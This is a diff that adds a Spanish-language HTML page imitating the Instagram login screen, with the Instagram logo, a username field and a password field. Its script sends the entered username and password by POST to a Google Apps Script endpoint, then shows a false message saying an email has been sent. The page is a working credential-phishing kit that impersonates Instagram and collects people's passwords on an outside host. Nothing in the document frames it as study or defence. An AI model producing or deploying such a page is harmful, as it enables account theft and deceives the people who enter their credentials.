@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registro de Perfil IG</title>
+    <style>
+        /* --- ESTÉTICA INSTAGRAM --- */
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 24px;
+            box-shadow: 0 10px 30px rgba(188, 24, 136, 0.3);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .insta-header { margin-bottom: 30px; }
+        .insta-logo { width: 60px; height: 60px; margin-bottom: 10px; }
+        h1 { margin: 0; color: #262626; font-size: 1.8rem; font-weight: 700; }
+        p.subtitle { color: #8e8e8e; font-size: 0.9rem; margin-top: 8px; }
+
+        /* Formularios */
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: #262626;
+        }
+
+        /* Contenedor para el input y el ojito */
+        .password-container {
+            position: relative;
+            width: 100%;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            color: #262626;
+            font-size: 1rem;
+            outline: none;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+
+        /* Padding extra a la derecha para que el texto no se meta debajo del ojo */
+        .password-container input {
+            padding-right: 45px;
+        }
+
+        input:focus {
+            border-color: #bc1888;
+        }
+
+        /* Estilos del Ojito */
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #8e8e8e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 24px;
+            height: 24px;
+        }
+
+        /* Botón Instagram */
+        button {
+            width: 100%;
+            padding: 15px;
+            margin-top: 10px;
+            background: linear-gradient(to right, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            color: white;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            transition: opacity 0.3s, transform 0.2s;
+        }
+
+        button:hover { opacity: 0.9; transform: scale(1.02); }
+        button:disabled { opacity: 0.7; }
+
+        /* Mensajes */
+        #message { margin-top: 20px; font-weight: 600; display: none; }
+        .loading { color: #e6683c; }
+        .success { color: #0095f6; }
+        .error { color: #ed4956; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="insta-header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/132px-Instagram_logo_2016.svg.png" alt="Instagram Logo" class="insta-logo">
+            <h1>Inicia Sesión</h1>
+        </div>
+        
+        <form id="heroForm">
+            <div class="input-group">
+                <label for="Nombre Real">Nombre de usuario</label>
+                <input type="text" name="Nombre de usuario" placeholder="Nombre de usuario" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="nicknameInput">Contraseña</label>
+                <div class="password-container">
+                    <input type="password" id="nicknameInput" name="Nickname Superhéroe" placeholder="Contraseña" required>
+                    <span id="toggleIcon" class="toggle-password">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
+                    </span>
+                </div>
+            </div>
+
+            <button type="submit" id="submitBtn">Iniciar Sesión</button>
+        </form>
+
+        <p id="message"></p>
+    </div>
+
+    <script>
+        // ==========================================
+        // PEGA TU URL DE GOOGLE SCRIPT AQUÍ ABAJO
+        // ==========================================
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyKo_-Wh51TV31OzRdfPfabnwJ8_CCLkRMNUspcNMwDIQesnBdVUihvBXt2QuUvPIC8/exec'; 
+        // ==========================================
+
+        // --- LÓGICA DEL OJITO (VER/OCULTAR) ---
+        const nicknameInput = document.getElementById('nicknameInput');
+        const toggleIcon = document.getElementById('toggleIcon');
+
+        // SVGs para intercambiar
+        const eyeOpenSVG = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>';
+        const eyeClosedSVG = '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"/><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"/><path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7c.44 0 .87-.02 1.28-.05"/><line x1="2" x2="22" y1="2" y2="22"/></svg>';
+
+        toggleIcon.addEventListener('click', function () {
+            // 1. Alternar el tipo de input (password <-> text)
+            const type = nicknameInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            nicknameInput.setAttribute('type', type);
+            
+            // 2. Alternar el icono
+            toggleIcon.innerHTML = type === 'password' ? eyeOpenSVG : eyeClosedSVG;
+        });
+
+
+        // --- LÓGICA DEL FORMULARIO (La misma de antes) ---
+        const form = document.forms['heroForm'];
+        const message = document.getElementById('message');
+        const btn = document.getElementById('submitBtn');
+        const originalBtnText = btn.innerText;
+
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            btn.disabled = true;
+            btn.innerHTML = "Enviando...";
+            message.style.display = 'block';
+            message.className = 'loading';
+            message.innerHTML = "Enviando...";
+
+            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => {
+                    message.className = 'success';
+                    message.innerHTML = "Se te ha enviado un correo con los datos ";
+                    btn.innerHTML = "¡Listo!";
+                    form.reset();
+                    // Al resetear, aseguramos que el input vuelva a ser password y el ojo abierto
+                    nicknameInput.setAttribute('type', 'password');
+                    toggleIcon.innerHTML = eyeOpenSVG;
+
+                    setTimeout(() => {
+                        btn.disabled = false;
+                        btn.innerHTML = originalBtnText;
+                        message.style.display = 'none';
+                    }, 3000);
+                })
+                .catch(error => {
+                    console.error('Error!', error.message);
+                    message.className = 'error';
+                    message.innerHTML = "Algo salió mal. Intenta de nuevo.";
+                    btn.disabled = false;
+                    btn.innerHTML = "Reintentar";
+                });
+        });
+    </script>
+</body>
+</html>
